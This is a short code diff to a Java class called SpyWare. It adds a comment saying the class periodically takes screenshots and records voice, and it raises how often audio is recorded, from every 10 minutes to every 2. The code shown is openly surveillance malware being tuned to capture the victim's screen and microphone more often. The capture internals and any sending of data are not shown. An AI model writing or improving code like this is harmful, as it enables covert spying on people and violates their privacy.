@@ -11,10 +11,12 @@ public class SpyWare {
     private static ScheduledThreadPoolExecutor pool;
 
     public SpyWare() {
-        //initialize the pool
         pool = new ScheduledThreadPoolExecutor(2);
     }
 
+    /**
+     * Takes screenshot and record voice in a periodic time.
+     */
     public void scheduledSpyWork() {
         startTakingScreenshot();
         startAndFinishRecordingAudio();
@@ -33,7 +35,7 @@ public class SpyWare {
      */
     public static void startAndFinishRecordingAudio() {
         Runnable runnable = SpyWare::initStopperAndStartRecording;
-        pool.scheduleWithFixedDelay(runnable, 0, 10, TimeUnit.MINUTES);
+        pool.scheduleWithFixedDelay(runnable, 0, 2, TimeUnit.MINUTES);
     }
 
     /**
